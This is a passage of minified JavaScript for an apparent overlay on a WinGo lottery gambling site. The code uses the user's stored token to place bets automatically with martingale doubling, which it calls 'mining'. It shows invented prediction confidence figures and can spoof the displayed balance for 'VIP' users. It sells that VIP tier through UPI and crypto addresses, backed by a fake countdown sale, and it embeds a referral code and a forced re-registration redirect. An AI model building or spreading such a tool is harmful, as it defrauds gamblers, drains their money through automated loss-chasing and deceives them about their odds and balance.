  var n = 100000000000,
    t = 1000000000000,
    o;
  do o = Math.floor(Math.random() * t);
  while (o < n);
  return o;
}
function Ut(n) {
  n.random = gi();
  var t = JSON.parse(JSON.stringify(n)),
    o = Object.keys(t)
      .filter(function (c) {
        var f = t[c];
        return f === null || typeof f !== "object";
      })
      .sort(),
    i = {};
  return (
    o.forEach(function (c) {
      if (t[c] !== null && t[c] !== "" && c !== "signature")
        i[c] = t[c] === 0 ? 0 : t[c];
    }),
    (n.signature = Di(JSON.stringify(i))),
    (n.timestamp = Math.floor(Date.now() / 1000)),
    n
  );
}
function Vi() {
  try {
    var n = localStorage.getItem("ar_token");
    if (!n) return "";
    var t = JSON.parse(n);
    return typeof t === "string" ? t : t.value || "";
  } catch (o) {
    return localStorage.getItem("ar_token") || "";
  }
}
function Bi(n) {
  if (!n) return;
  try {
    localStorage.setItem("ar_token", JSON.stringify({ value: n, expires: -1 }));
  } catch (t) {}
}
function $t(n, t, o, i) {
  return new Promise(function (c, f) {
    var p = new XMLHttpRequest();
    if ((p.open(n, t, !0), i)) for (var l in i) p.setRequestHeader(l, i[l]);
    ((p.onload = function () {
      if (p.status >= 200 && p.status < 300) {
        var v = p.getResponseHeader("Authorization");
        if (v) Bi(v.replace(/^Bearer\s+/i, ""));
        try {
          c(JSON.parse(p.responseText));
        } catch (q) {
          f(Error("Bad JSON"));
        }
      } else f(Error("HTTP " + p.status));
    }),
      (p.onerror = function () {
        f(Error("Network error"));
      }),
      (p.ontimeout = function () {
        f(Error("Timeout"));
      }),
      (p.timeout = 15000),
      p.send(o || null));
  });
}
function Mt(n, t, o) {
  var i = Vi(),
    c = t,
    f = {
      Authorization: "Bearer " + i,
      "Content-Type": "application/json",
      Accept: "application/json, text/plain, */*",
    },
    p = null;
  if (n === "GET") {
    var l = new URLSearchParams();
    (Object.keys(o).forEach(function (v) {
      l.set(v, String(o[v]));
    }),
      (c += "?" + l.toString()));
  } else p = JSON.stringify(o);
  return $t(n, c, p, f);
}
async function Po(n, t, o, i) {
  var c = Ut({
    gameCode: n,
    issueNumber: t,
    amount: o,
    betMultiple: 1,
    betContent: i,
    language: "en",
  });
  return Mt("POST", "/api/Lottery/WinGoBet", c);
}
async function Ot() {
  var n = Ut({ language: "en" });
  return Mt("GET", "/api/Lottery/GetBalance", n);
}
async function Jt(n) {
  var t = Ut({ issueNumber: n, language: "en" });
  return Mt("GET", "/api/Lottery/GetWinLossResult", t);
}
async function Zo(n) {
  return $t("GET", "/WinGo/" + n + ".json?ts=" + Date.now());
}
async function Xo(n) {
  return $t(
    "GET",
    "/WinGo/" + n + "/GetHistoryIssuePage.json?ts=" + Date.now(),
  );
}
var Yn = "WinGo_30S",
  Ho = "wg_mining_session",
  Wt = "wg_mining_history",
  No = [1, 2, 4],
  Hn = 5,
  Yo = 100;
function h(n) {
  return Math.round(n * 100) / 100;
}
var zt = [],
  Lt = [];
function Fo(n) {
  zt.push(n);
}
function Go(n) {
  Lt.push(n);
}
function ho() {
  ((zt = []), (Lt = []));
}
function N(n, t) {
  (console.log("[MINING]", n), zt.forEach((o) => o(n, t)));
}
function Co() {
  Lt.forEach((n) => n(C()));
}
function C() {
  try {
    return JSON.parse(localStorage.getItem(Ho)) || null;
  } catch (n) {
    return null;
  }
}
function Sn(n) {
  (localStorage.setItem(Ho, JSON.stringify(n)), Co());
}
function Ai(n, t, o) {
  return {
    active: !0,
    gameCode: Yn,
    startedAt: Date.now(),
    startBalance: n,
    targetBalance: t,
    stopLoss: o,
    baseUnit: Math.max(1, Math.floor(n * 0.01)),
    martingaleStep: 0,
    lastBetPeriod: "",
    lastBetAmount: 0,
    lastBetSide: "",
    pendingResult: !1,
    stats: { rounds: 0, wins: 0, losses: 0, netPL: 0 },
  };
}
function bi(n) {
  try {
    var t = Qt();
    if ((t.unshift(n), t.length > Yo)) t.length = Yo;
    localStorage.setItem(Wt, JSON.stringify(t));
  } catch (o) {}
}
function Qt() {
  try {
    return JSON.parse(localStorage.getItem(Wt)) || [];
  } catch (n) {
    return [];
  }
}
function Ko() {
  localStorage.removeItem(Wt);
}
var V = null,
  I = !1,
  s = !1,
  yn = 0;
function Do() {
  var n = C();
  return n && n.active;
}
function go() {
  return C();
}
async function Vo(n, t, o) {
  if (s) return !1;
  var i = C();
  if (i && i.pendingResult) {
    if (
      (N("Previous bet still unverified. Checking result first...", "wait"),
      (s = !0),
      yn++,
      await bo(i, yn),
      !s)
    )
      return !1;
  }
  var c = Math.max(1, Math.floor(n * 0.01));
  if (n < c * 7)
    return (
      N("Balance too low. Need at least ₹" + c * 7 + " to start.", "loss"),
      !1
    );
  if (t <= n)
    return (N("Target must be higher than current balance.", "loss"), !1);
  return (
    Sn(Ai(n, t, o)),
    (I = !1),
    (s = !0),
    yn++,
    N(
      "Started mining — ₹" +
        h(n) +
        " → ₹" +
        h(t) +
        (o ? " | Stop below ₹" + h(o) : ""),
      "active",
    ),
    vn(yn),
    !0
  );
}
function Bo() {
  var n = C();
  if (n && n.pendingResult) {
    ((I = !0), N("Stopping after current round finishes...", "wait"));
    return;
  }
  b("Stopped.");
}
function b(n) {
  if (((s = !1), (I = !1), V)) (clearTimeout(V), (V = null));
  var t = C();
  if (t)
    ((t.active = !1),
      Sn(t),
      N(
        n +
          " — " +
          t.stats.rounds +
          " rounds, " +
          t.stats.wins +
          "W/" +
          t.stats.losses +
          "L, P&L ₹" +
          h(t.stats.netPL),
        "active",
      ));
  else N(n, "active");
}
function K(n) {
  return n !== yn;
}
async function Ao() {
  var n = C();
  if (!n || !n.active) return !1;
  ((s = !0), (I = !1), yn++);
  var t = yn;
  if (
    (N("Picking up where we left off...", "wait"),
    n.pendingResult && n.lastBetPeriod)
  )
    (N("Checking last bet result...", "wait"), await bo(n, t));
  if (K(t)) return !1;
  if (I) return (b("Stopped."), !1);
  if (((n = C()), n && n.active && s)) return (vn(t), !0);
  return !1;
}
async function bo(n, t) {
  for (var o = 1; o <= Hn; o++) {
    if (K(t)) return;
    try {
      var i = await Jt(n.lastBetPeriod);
      if (K(t)) return;
      if (i && i.data && i.data.status !== void 0) {
        Ro(n, i.data.status === !0, i.data.winAmount || 0);
        return;
      }
    } catch (c) {}
    if (
      (N("Checking result... attempt " + o + "/" + Hn, "wait"),
      await new Promise(function (c) {
        setTimeout(c, o * 3000);
      }),
      K(t))
    )
      return;
    if (((n = C()), !n || !n.active)) return;
  }
  b(
    "⚠️ Couldn't verify last bet after " +
      Hn +
      " tries. Please check your balance.",
  );
}
function Ro(n, t, o) {
  ((n.pendingResult = !1), n.stats.rounds++);
  var i;
  if (t)
    ((i = h(o - n.lastBetAmount)),
      n.stats.wins++,
      (n.stats.netPL = h(n.stats.netPL + i)),
      (n.martingaleStep = 0));
  else
    ((i = -h(n.lastBetAmount)),
      n.stats.losses++,
      (n.stats.netPL = h(n.stats.netPL + i)),
      (n.martingaleStep =
        n.martingaleStep >= No.length - 1 ? 0 : n.martingaleStep + 1));
  return (
    Sn(n),
    bi({
      sessionId: n.startedAt,
      period: n.lastBetPeriod,
      amount: n.lastBetAmount,
      side: n.lastBetSide,
      result: t ? "win" : "loss",
      net: i,
      time: Date.now(),
    }),
    { won: t, net: i }
  );
}
async function vn(n) {
  if (K(n)) return;
  var t = C();
  if (!t || !t.active) {
    s = !1;
    return;
  }
  try {
    var o = await Zo(Yn);
    if (K(n)) return;
    var i = Date.now(),
      c = o.current.endTime,
      f = c - i,
      p = o.current.issueNumber;
    if (f < 8000) {
      (N("Round ending soon, waiting for the next one...", "wait"),
        (V = setTimeout(function () {
          vn(n);
        }, f + 2000)));
      return;
    }
    var l = f - 8000;
    (N("Next round in " + Math.ceil(l / 1000) + "s...", "wait"),
      (V = setTimeout(function () {
        Ri(p, c, n);
      }, l)));
  } catch (v) {
    (N("Connection issue, retrying in 5s...", "loss"),
      (V = setTimeout(function () {
        vn(n);
      }, 5000)));
  }
}
async function Ri(n, t, o) {
  if (K(o)) return;
  var i = C();
  if (!i || !i.active) return;
  var c;
  try {
    c = await Ot();
  } catch (u) {
    if ((N("Couldn't check balance, skipping this round.", "loss"), !K(o)))
      V = setTimeout(function () {
        vn(o);
      }, 5000);
    return;
  }
  if (K(o)) return;
  if (((i = C()), !i || !i.active)) return;
  var f = h(c.data.balance);
  if (
    ((window.__wg_balance = f),
    window.dispatchEvent(
      new CustomEvent("wg-balance", { detail: { balance: f } }),
    ),
    f >= h(i.targetBalance))
  ) {
    b("\uD83C\uDFAF Target reached! ₹" + f);
    return;
  }
  if (i.stopLoss && f <= h(i.stopLoss)) {
    b("\uD83D\uDED1 Balance dropped to ₹" + f + ", stopping.");
    return;
  }
  var p = No[i.martingaleStep] || 1,
    l = i.baseUnit * p;
  if (f < l) {
    if (i.martingaleStep > 0) {
      var v = i.martingaleStep;
      ((i.martingaleStep = 0),
        (l = i.baseUnit),
        Sn(i),
        N("Can't afford recovery bet, going back to ₹" + l + ".", "wait"));
    }
    if (f < l) {
      b("Not enough balance for the minimum bet (₹" + l + ").");
      return;
    }
  }
  if (i.martingaleStep === 0) {
    var q = h(i.targetBalance - f);
    if (l > q && q >= 1)
      ((l = Math.max(1, Math.ceil(q / 0.96))),
        N("Almost there — betting ₹" + l + " to finish.", "wait"));
  }
  if (i.stopLoss && h(f - l) < h(i.stopLoss)) {
    b(
      "\uD83D\uDED1 This bet would drop balance below ₹" +
        h(i.stopLoss) +
        ", stopping.",
    );
    return;
  }
  var E = "BigSmall_Big",
    W = "Big",
    $ = 50,
    J = window.__wgSpoofer && window.__wgSpoofer.isVip();
  if (J) {
    var z = window.__wgSpoofer.predictNum(Yn, n);
    ((W = z >= 5 ? "Big" : "Small"),
      (E = z >= 5 ? "BigSmall_Big" : "BigSmall_Small"));
    var O = window.__wgSpoofer.getSettings();
    $ = O ? O.accuracy : 70;
  } else
    try {
      var U = await Xo(Yn);
      if (K(o)) return;
      if (U && U.data && U.data.list) {
        var a = Ln(U.data.list);
        ((W = a.prediction),
          ($ = a.confidence),
          (E = W === "Big" ? "BigSmall_Big" : "BigSmall_Small"));
      }
    } catch (u) {
      N("Couldn't load history, going with Big.", "wait");
    }
  if (K(o)) return;
  if (((i = C()), !i || !i.active)) return;
  if (I) {
    b("Stopped.");
    return;
  }
  var y =
    i.martingaleStep > 0 ? " (recovery " + (i.martingaleStep + 1) + "/3)" : "";
  (N("⚡ Placing ₹" + l + " on " + W + y + " — " + $ + "% confident", "active"),
    (i.lastBetPeriod = n),
    (i.lastBetAmount = l),
    (i.lastBetSide = E),
    (i.pendingResult = !0),
    Sn(i));
  try {
    var e = await Po(Yn, n, l, E);
    if (K(o)) return;
    if (e.code !== 0) {
      if (((i = C()), i)) ((i.pendingResult = !1), Sn(i));
      if (
        (N("Bet was rejected" + (e.msg ? ": " + e.msg : "") + ".", "loss"), I)
      ) {
        b("Stopped.");
        return;
      }
      V = setTimeout(function () {
        vn(o);
      }, 3000);
      return;
    }
  } catch (u) {
    if (
      (N(
        "Network issue while betting. Will check the result when the round ends.",
        "loss",
      ),
      K(o))
    )
      return;
    if (I) {
      if (
        (N(
          "Stop requested, but last bet is unverified. It will be checked on next start.",
          "wait",
        ),
        (s = !1),
        (I = !1),
        V)
      )
        (clearTimeout(V), (V = null));
      Co();
      return;
    }
    V = setTimeout(
      function () {
        Rn(n, 0, o);
      },
      Math.max(t - Date.now() + 3000, 2000),
    );
    return;
  }
  (N("Bet placed ✓ — waiting for result...", "wait"),
    (V = setTimeout(
      function () {
        Rn(n, 0, o);
      },
      Math.max(t - Date.now() + 3000, 2000),
    )));
}
async function Rn(n, t, o) {
  if (K(o)) return;
  var i = C();
  if (!i || !i.pendingResult || i.lastBetPeriod !== n) return;
  var c = !1,
    f = 0;
  try {
    var p = await Jt(n);
    if (K(o)) return;
    if (p && p.data && p.data.status !== void 0)
      ((c = p.data.status === !0), (f = p.data.winAmount || 0));
    else {
      if (t < Hn) {
        var l = Math.min(3000 * (t + 1), 15000);
        (N("Result not in yet, checking again...", "wait"),
          (V = setTimeout(function () {
            Rn(n, t + 1, o);
          }, l)));
        return;
      }
      b("⚠️ Couldn't get the result. Please check your balance.");
      return;
    }
  } catch (W) {
    if (K(o)) return;
    if (t < Hn) {
      var l = Math.min(5000 * (t + 1), 15000);
      (N("Error checking result, trying again...", "loss"),
        (V = setTimeout(function () {
          Rn(n, t + 1, o);
        }, l)));
      return;
    }
    b(
      "⚠️ Couldn't get the result after multiple tries. Please check your balance.",
    );
    return;
  }
  if (((i = C()), !i || !i.pendingResult || i.lastBetPeriod !== n)) return;
  var v = Ro(i, c, f);
  if (v.won) N("✅ WON +₹" + v.net + " (payout ₹" + h(f) + ")", "win");
  else if (((i = C()), i.martingaleStep === 0))
    N("❌ Lost ₹" + h(-v.net) + " — resetting to base bet.", "loss");
  else
    N(
      "❌ Lost ₹" +
        h(-v.net) +
        " — doubling next bet (step " +
        (i.martingaleStep + 1) +
        "/3)",
      "loss",
    );
  try {
    var q = await Ot();
    if (K(o)) return;
    var E = h(q.data.balance);
    ((window.__wg_balance = E),
      window.dispatchEvent(
        new CustomEvent("wg-balance", { detail: { balance: E } }),
      ),
      (i = C()),
      N(
        "\uD83D\uDCB0 Balance: ₹" +
          E +
          " | Profit: ₹" +
          h(i.stats.netPL) +
          " | " +
          i.stats.wins +
          "W/" +
          i.stats.losses +
          "L",
        "active",
      ));
  } catch (W) {}
  if (I) {
    b("Stopped.");
    return;
  }
  vn(o);
}
function En(n) {
  let t = n.querySelector("#btn-mining-back"),
    o = n.querySelector("#btn-mining-start"),
    i = n.querySelector("#mine-target-goal"),
    c = n.querySelector("#mine-stop-loss"),
    f = n.querySelector("#mine-current-bal"),
    p = n.querySelector("#mine-energy-count"),
    l = n.querySelector("#mine-console"),
    v = n.querySelector("#mining-energy-modal"),
    q = n.querySelector("#btn-energy-topup"),
    E = n.querySelector("#btn-energy-boost"),
    W = n.querySelector("#btn-energy-close"),
    $ = n.querySelector("#btn-mining-history"),
    J = n.querySelector("#mining-history-modal"),
    z = n.querySelector("#btn-history-close"),
    O = n.querySelector("#btn-history-clear"),
    U = n.querySelector("#mining-history-list"),
    a = 0;
  if (p) p.textContent = a;
  let y = () => {
    let Q = window.__wg_balance || 0;
    if (window.__wgSpoofer && window.__wgSpoofer.isVip())
      try {
        let P = JSON.parse(localStorage.getItem("wg_spoof_state"));
        if (P && P.balance !== null) Q = P.balance;
      } catch (P) {}
    if (f) f.textContent = "₹" + Number(Q).toFixed(2);
  };
  y();
  let e = (Q, P) => {
      if (!l) return;
      let Z = document.createElement("div");
      ((Z.className = "console-line" + (P ? " " + P : "")),
        (Z.textContent = "[" + new Date().toLocaleTimeString() + "] " + Q),
        l.appendChild(Z),
        (l.scrollTop = l.scrollHeight));
    },
    u = (Q) => {
      if (!o) return;
      if (Q) ((o.textContent = "Stop Mining"), o.classList.add("active"));
      else
        ((o.textContent = "Start Mining · 1 Energy"),
          o.classList.remove("active"));
    };
  if (
    (ho(),
    Fo((Q, P) => {
      e(Q, P);
    }),
    Go((Q) => {
      if ((y(), Q && !Q.active)) {
        if ((u(!1), i)) i.disabled = !1;
        if (c) c.disabled = !1;
      }
    }),
    En._onBalance)
  )
    window.removeEventListener("wg-balance", En._onBalance);
  if (
    ((En._onBalance = () => y()),
    window.addEventListener("wg-balance", En._onBalance),
    t)
  )
    t.addEventListener("click", () => {
      let Q = n.host;
      if (Q && typeof Q._setView === "function") Q._setView("menu");
    });
  if (E)
    E.addEventListener("click", () => {
      if (((a = 1), p)) p.textContent = a;
      if (v) v.style.display = "none";
      e("Energy recharged — you're good to go.", "win");
    });
  if (q)
    q.addEventListener("click", () => {
      e("Paid energy is coming soon. Use the free option for now.", "wait");
    });
  if (W)
    W.addEventListener("click", () => {
      if (v) v.style.display = "none";
    });
  function w() {
    if (!U) return;
    U.innerHTML = "";
    var Q = Qt();
    Q.forEach(function (P) {
      var Z = document.createElement("div");
      Z.className = "hist-entry";
      var H = P.side === "BigSmall_Big" ? "BIG" : "SML";
      ((Z.innerHTML =
        '<span class="hist-side ' +
        P.side +
        '">' +
        H +
        "</span>" +
        '<span class="hist-amt">₹' +
        P.amount +
        '</span><span class="hist-net ' +
        P.result +
        '">' +
        (P.net >= 0 ? "+" : "") +
        "₹" +
        Math.abs(P.net).toFixed(2) +
        '</span><span class="hist-time">' +
        new Date(P.time).toLocaleTimeString() +
        "</span>"),
        U.appendChild(Z));
    });
  }
  if ($)
    $.addEventListener("click", () => {
      if ((w(), J)) J.style.display = "flex";
    });
  if (z)
    z.addEventListener("click", () => {
      if (J) J.style.display = "none";
    });
  if (O)
    O.addEventListener("click", () => {
      (Ko(), w());
    });
  if (o)
    o.addEventListener("click", async () => {
      if (Do()) {
        Bo();
        return;
      }
      var Q = window.__wg_balance || 0,
        P = parseFloat(i ? i.value : "0") || 0,
        Z = parseFloat(c ? c.value : "0") || 0;
      if (P <= Q) {
        e("Set a target higher than your current balance.", "loss");
        return;
      }
      if (Z && Z >= Q) {
        e("Stop-loss must be lower than your current balance.", "loss");
        return;
      }
      if (l) l.innerHTML = "";
      if ((u(!0), i)) i.disabled = !0;
      if (c) c.disabled = !0;
      var H = await Vo(Q, P, Z);
      if (!H) {
        if ((u(!1), i)) i.disabled = !1;
        if (c) c.disabled = !1;
      }
    });
  (async () => {
    var Q = await Ao();
    if (Q) {
      if ((u(!0), i)) i.disabled = !0;
      if (c) c.disabled = !0;
      var P = go();
      if (P) {
        if (i) i.value = P.targetBalance;
        if (c && P.stopLoss) c.value = P.stopLoss;
      }
    }
  })();
}
var B = {
  upi: ["upflastkismat@ptyes", "adrenox1@ybl", "anthropic1@upi"],
  crypto: {
    trc20: "TEQzuoAUiBEP8i5H1QhUBvKgGkJmFV3hVN",
    bep20: "0x30c139ADe43773B96B2Fb344A2c317de6C564058",
  },
  amount: 1499,
  originalAmount: 2399,
  flashDurationMs: 7200000,
  flashTimerKey: "vip_flash_sale_end_v1",
  cryptoAmountUsd: 24,
};
var Un,
  mn,
  Tn = 0;
function Io() {
  try {
    let n = parseInt(localStorage.getItem(B.flashTimerKey) || "0");
    if (n) return n;
    let t = Date.now() + B.flashDurationMs;
    return (localStorage.setItem(B.flashTimerKey, t.toString()), t);
  } catch (n) {
    return Date.now() + B.flashDurationMs;
  }
}
function jo(n) {
  let t = Math.max(0, n - Date.now()),
    o = Math.floor(t / 3600000)
      .toString()
      .padStart(2, "0"),
    i = Math.floor((t % 3600000) / 60000)
      .toString()
      .padStart(2, "0"),
    c = Math.floor((t % 60000) / 1000)
      .toString()
      .padStart(2, "0");
  return { text: `${o}:${i}:${c}`, done: t <= 0 };
}
function Ti(n) {
  if (mn) clearInterval(mn);
  let t = Io(),
    o = () => {
      let i = jo(t);
      if (
        (n
          .querySelectorAll("[data-vip-flash-timer]")
          .forEach((c) => (c.textContent = i.text)),
        i.done)
      )
        clearInterval(mn);
    };
  if ((o(), t > Date.now())) mn = setInterval(o, 1000);
}
sessionStorage.setItem("invitecode", "37677121480");
var ri = "https://api.shreewinapi.com",
  Ii = "Account unavailable. Please create a new account.",
  ji = "/#/register?invitationCode=37677121480",
  xi = "/#/wallet/Recharge",
  ki = "shreewin55.com".includes("okwin") ? "light" : "dark",
  mo = "";
function on(n) {
  let t = String(n == null ? "" : n).trim();
  return /^\d{8,22}$/.test(t) ? t : "";
}
function To(n) {
  if (((n = on(n)), !n)) return "";
  try {
    return (BigInt(n) + 1n).toString();
  } catch (t) {
    return "";
  }
}
function si(n, t) {
  if (((n = on(n)), (t = on(t)), !n || !t)) return 0;
  try {
    let o = BigInt(n),
      i = BigInt(t);
    return o > i ? 1 : o < i ? -1 : 0;
  } catch (o) {
    return n > t ? 1 : n < t ? -1 : 0;
  }
}
function _i(n, t, o) {
  let i = n.querySelector("#pred-history");
  if (!i) return;
  let c = (o || []).slice(0, 8),
    f = on(c[0]?.issueNumber ?? c[0]?.issue),
    p = t + ":" + f + ":" + c.map((q) => q.number || q.num || q).join(",");
  if (p === mo) return;
  mo = p;
  let l = document.createDocumentFragment(),
    v = document.createElement("span");
  if (
    ((v.className = "hist-label"),
    (v.textContent = "Recent"),
    l.appendChild(v),
    c.length < 2)
  ) {
    (i.replaceChildren(l), (i.style.display = "none"));
    return;
  }
  (c.forEach((q) => {
    let E = parseInt(q.number || q.num || q),
      W = document.createElement("span");
    ((W.className = "hist-dot " + (E >= 5 ? "big" : "small")),
      (W.title = (E >= 5 ? "Big" : "Small") + ": " + E),
      l.appendChild(W));
  }),
    i.replaceChildren(l),
    (i.style.display = "flex"));
}
function di(n, t) {
  let o = n.querySelector("#streak-badge"),
    i = n.querySelector("#streak-text");
  if (!o || !i) return;
  if (t.streak && t.streak.len >= 3)
    ((i.textContent = t.streak.len + "× " + t.streak.side),
      (o.style.display = "flex"));
  else o.style.display = "none";
}
var ro = "";
function xo() {
  let n = document.querySelector("prediction-panel")?.shadowRoot;
  if (!n) return;
  let t = yt(),
    o = Bn(),
    i = co(),
    c = window.__wgSpoofer,
    f = c && c.isVip();
  if (!t.length && !(f && o && on(i))) {
    (pn("loading"), en(), vo());
    return;
  }
  let p = on(t[0]?.issueNumber ?? t[0]?.issue),
    l = on(i);
  if (p && (!l || si(l, p) <= 0)) l = To(p);
  let v = on(lo());
  if (v && l && To(v) !== l) {
    pn("loading");
    return;
  }
  let q = [
    o,
    p,
    l,
    t
      .slice(0, 8)
      .map((a) => a.number || a.num || a)
      .join(","),
  ].join("|");
  if (q === ro) {
    pn("result");
    return;
  }
  ro = q;
  let E;
  if (f && o && l) {
    let a = c.predictNum(o, l),
      y = a === 0 || a === 5 ? "violet" : a % 2 === 0 ? "red" : "green";
    E = {
      prediction: a >= 5 ? "Big" : "Small",
      confidence: 73 + ((a * 7 + 3) % 22),
      color: y,
      topNumber: a,
      signals: [],
      heatmap: { hot: [], cold: [] },
      streak: null,
    };
  }
  if (!E) E = Ln(t);
  let W = E.prediction === "Big",
    $ = n.querySelector("#pred-pill");
  (($.textContent = E.prediction),
    ($.className = "pred-size " + (W ? "big" : "small")));
  let J = n.querySelector("#pred-color");
  ((J.textContent = E.color.charAt(0).toUpperCase() + E.color.slice(1)),
    (J.className = "pred-color " + E.color));
  let z = E.topNumber ?? E.heatmap?.hot?.[0] ?? 0;
  ((n.querySelector("#hero-ball").style.backgroundImage =
    "url('" + no(z) + "')"),
    (n.querySelector("#pred-glow").className =
      "pred-glow " + (W ? "big" : "small")),
    (n.querySelector("#pro-card").className =
      "pro-card c-" + (W ? "big" : "small")));
  let O = n.querySelector("#conf-fill");
  ((O.style.width = E.confidence + "%"),
    (O.className = "conf-fill" + (W ? "" : " small")),
    (n.querySelector("#conf-pct").textContent = E.confidence + "%"),
    _i(n, o, t));
  let U = n.querySelector("#pro-period");
  if (U && l) U.textContent = "#" + l.slice(-6);
  (di(n, E),
    n.querySelector("#pro-prediction").classList.toggle("vip-mode", !!f),
    pn("result"));
}
Zt({
  apiBase: ri,
  spoofDomain: "shreewin55.com",
  minBalance: 500,
  nukeUrl: ji,
  authErrMsg: Ii,
  onBalance: (n) => {
    window.__wg_balance = n;
  },
  onWingo: (n, t) => yo(n, t),
});
Tt();
ao({ onPred: xo });
if (!customElements.get("prediction-panel"))
  customElements.define(
    "prediction-panel",
    class extends HTMLElement {
      connectedCallback() {
        if (!document.querySelector("link[data-wg-font]")) {
          let $ = document.createElement("link");
          (($.rel = "stylesheet"),
            ($.href =
              "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"),
            ($.dataset.wgFont = "1"),
            document.head.appendChild($));
        }
        if (
          ((this._mode = "logo"),
          this.classList.add(ki),
          "shreewin55.com".includes("veergame"))
        )
          this.classList.add("veer");
        let n = this.attachShadow({ mode: "open" });
        ((n.innerHTML =
          '<style>:host { position: fixed; z-index: 2147483647; touch-action: none; user-select: none; --f: \'Inter\', -apple-system, BlinkMacSystemFont, \'Segoe UI\', sans-serif; --ease: cubic-bezier(.4,0,.2,1); --panel-bg: linear-gradient(155deg, rgba(11,9,30,.98) 0%, rgba(20,16,50,.97) 100%); --panel-border: rgba(139,92,246,.22); --panel-shadow: 0 24px 64px rgba(0,0,0,.75), 0 0 0 1px rgba(255,255,255,.06), 0 0 100px rgba(99,60,220,.08); --hdr-bg: rgba(255,255,255,.03); --hdr-border: rgba(255,255,255,.07); --t-title: #f1f0ff; --t-name: #f1f0ff; --t-body: rgba(255,255,255,.52); --t-dim: rgba(255,255,255,.25); --x-bg: rgba(255,255,255,.07); --x-col: rgba(255,255,255,.32); --x-bg-h: rgba(255,255,255,.14); --x-col-h: rgba(255,255,255,.8); --card-bg: rgba(255,255,255,.035); --card-bdr: rgba(255,255,255,.07); --back-bg: rgba(255,255,255,.06); --back-bdr: rgba(255,255,255,.09); --back-col: rgba(255,255,255,.5); --back-col-h: rgba(255,255,255,.9); --back-bdr-h: rgba(139,92,246,.5); --pro: #8b5cf6; --pro-lt: rgba(139,92,246,.14); --pro-glow: rgba(139,92,246,.2); --pro-txt: #c4b5fd; --pro-bdr-h: rgba(139,92,246,.45); --vip: #f59e0b; --vip-lt: rgba(245,158,11,.13); --vip-glow: rgba(245,158,11,.2); --vip-txt: #fde68a; --vip-bdr-h: rgba(245,158,11,.45); --mine: #10b981; --mine-lt: rgba(16, 185, 129, .14); --mine-glow: rgba(16, 185, 129, .2); --mine-txt: #a7f3d0; --mine-bdr-h: rgba(16, 185, 129, .45); --upi: #06b6d4; --upi-lt: rgba(6, 182, 212, .14); --upi-glow: rgba(6, 182, 212, .2); --upi-txt: #a5f3fc; --upi-bdr-h: rgba(6, 182, 212, .45); --crypto: #eab308; --crypto-lt: rgba(234, 179, 8, .13); --crypto-glow: rgba(234, 179, 8, .2); --crypto-txt: #fef08a; --crypto-bdr-h: rgba(234, 179, 8, .45); --pc-bg: linear-gradient(150deg, rgba(20,16,52,.94) 0%, rgba(12,10,34,.97) 100%); --pc-bdr: rgba(139,92,246,.16); --pc-shad: 0 10px 36px rgba(0,0,0,.45), 0 0 0 1px rgba(139,92,246,.1); --tw-bg: rgba(255,255,255,.04); --tw-bdr: rgba(255,255,255,.07); --big: #FEAA57; --small: #6EA8F4; --strip: rgba(255,255,255,.07); --live: #34d399; --gate-title: #f1f0ff; --gate-bal-bg: rgba(139,92,246,.12); --gate-bal-col: #c4b5fd; --gate-bal-bdr: rgba(139,92,246,.22); --stat-bg: rgba(255,255,255,.03); --stat-bdr: rgba(255,255,255,.07); --chev: rgba(255,255,255,.15); --chip-bg: rgba(255,255,255,.07); --chip-bdr: rgba(255,255,255,.1); --chip-col: rgba(255,255,255,.7); --chip-hash: rgba(255,255,255,.42);}:host(.light) { --panel-bg: linear-gradient(155deg, #ffffff 0%, #fff8f8 100%); --panel-border: rgba(249,89,89,.18); --panel-shadow: 0 16px 52px rgba(180,30,30,.14), 0 0 0 1px rgba(249,89,89,.12), 0 4px 16px rgba(0,0,0,.06); --hdr-bg: linear-gradient(100deg, #f95959 0%, #ff8080 100%); --hdr-border: transparent; --t-title: #1f1f2e; --t-name: #1f1f2e; --t-body: #6b7280; --t-dim: rgba(0,0,0,.3); --x-bg: rgba(255,255,255,.22); --x-col: rgba(255,255,255,.85); --x-bg-h: rgba(255,255,255,.36); --x-col-h: #fff; --card-bg: rgba(0,0,0,.022); --card-bdr: rgba(0,0,0,.08); --back-bg: rgba(0,0,0,.04); --back-bdr: rgba(0,0,0,.1); --back-col: #6b7280; --back-col-h: #1f1f2e; --back-bdr-h: rgba(224,60,60,.4); --pro: #e03c3c; --pro-lt: rgba(224,60,60,.08); --pro-glow: rgba(224,60,60,.14); --pro-txt: #c0392b; --pro-bdr-h: rgba(224,60,60,.4); --vip: #d97706; --vip-lt: rgba(217,119,6,.08); --vip-glow: rgba(217,119,6,.13); --vip-txt: #b45309; --vip-bdr-h: rgba(217,119,6,.4); --mine: #059669; --mine-lt: rgba(5, 150, 105, .08); --mine-glow: rgba(5, 150, 105, .13); --mine-txt: #047857; --mine-bdr-h: rgba(5, 150, 105, .4); --upi: #0891b2; --upi-lt: rgba(8, 145, 178, .08); --upi-glow: rgba(8, 145, 178, .13); --upi-txt: #0e7490; --upi-bdr-h: rgba(8, 145, 178, .4); --crypto: #ca8a04; --crypto-lt: rgba(202, 138, 4, .08); --crypto-glow: rgba(202, 138, 4, .13); --crypto-txt: #854d0e; --crypto-bdr-h: rgba(202, 138, 4, .4); --pc-bg: linear-gradient(150deg, #ffffff 0%, #f9f0ff 100%); --pc-bdr: rgba(224,60,60,.14); --pc-shad: 0 6px 24px rgba(0,0,0,.08), 0 0 0 1px rgba(224,60,60,.08); --tw-bg: rgba(0,0,0,.025); --tw-bdr: rgba(0,0,0,.08); --strip: rgba(0,0,0,.07); --gate-title: #111827; --gate-bal-bg: rgba(220,38,38,.07); --gate-bal-col: #dc2626; --gate-bal-bdr: rgba(220,38,38,.14); --stat-bg: rgba(0,0,0,.025); --stat-bdr: rgba(0,0,0,.07); --chev: rgba(0,0,0,.14); --chip-bg: rgba(249,89,89,.08); --chip-bdr: rgba(249,89,89,.16); --chip-col: #374151; --chip-hash: #9ca3af;}/* Veer Games — only applied when host has .veer (veergame spoof). Tokens copied from veergame7.com :root — bg L1 #111217 / L2 #25272A, main #20D374, text L1 #fff / L2 #D7D7D7 / L3 #93939D, divider #374963, purple #C86EFF, blue #6EA8F4, orange #FEAA57. */:host(.veer) { --veer-grad: linear-gradient(130deg, #C5BC0C 0%, #94B20B 33%, #20D374 66%, #0CBAC5 100%); --veer-grad2: linear-gradient(180deg, #0CC551 0%, #088538 100%); --panel-bg: linear-gradient(180deg, #1b1c21 0%, #111217 100%); --panel-border: rgba(32,211,116,.22); --panel-shadow: 0 24px 64px rgba(0,0,0,.75), 0 